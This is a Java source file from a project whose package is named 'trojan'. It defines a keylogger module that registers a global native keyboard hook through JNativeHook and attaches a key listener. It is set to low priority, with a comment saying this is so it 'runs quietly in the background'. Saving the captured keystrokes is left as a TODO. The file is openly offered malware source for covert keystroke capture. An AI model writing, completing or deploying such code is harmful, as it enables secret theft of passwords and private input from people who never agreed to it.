package dev.px.trojan.Impl.Modules.KeyLogger;

import dev.px.trojan.Impl.Modules.Module;
import dev.px.trojan.Util.System.Keyboard;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class KeyloggerModule extends Module {

    public KeyloggerModule() {
        super("KeyLogger", true, Priority.LOW, ThreadMode.NONE); // We dont need a thread since JNativeHook already uses one
        // We are setting priority to low so that it runs quietly in the background

        try {
            if(!GlobalScreen.isNativeHookRegistered()) {
                GlobalScreen.registerNativeHook();
                GlobalScreen.addNativeKeyListener(new Keyboard());
            }
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void runNoThread() {
    }

    @Override
    public void run() {

    }

    @Override
    public void onDisable() {
        // TODO: Save to output file on disable
    }
}
